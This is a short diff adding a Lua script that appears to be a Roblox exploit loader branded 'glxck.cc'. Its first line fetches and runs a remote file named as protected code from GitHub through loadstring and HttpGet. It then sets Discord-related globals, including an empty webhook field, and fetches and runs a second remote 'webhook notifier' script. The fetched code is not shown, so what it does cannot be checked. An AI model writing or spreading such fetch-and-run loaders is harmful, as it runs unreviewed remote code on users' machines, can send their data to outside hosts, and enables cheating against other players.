@@ -1,0 +1,17 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/noGlxcka/glxck.ccc/main/Protected_4982147842562957.lua.txt'))()
+
+
+getgenv().Title = "glxck.cc"
+getgenv().ThumbnailUrl = "https://cdn.discordapp.com/icons/1230408358012522527/97927ea908f436c03e034e5a53f4af53.webp?size=2048"
+getgenv().Color = 0x000000 -- Black
+
+getgenv().FieldTitle = ""
+getgenv().FieldText = ""
+
+getgenv().FooterText = ""
+getgenv().FooterUrl = ""
+
+getgenv().Webhook = ""
+
+coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
+end)()
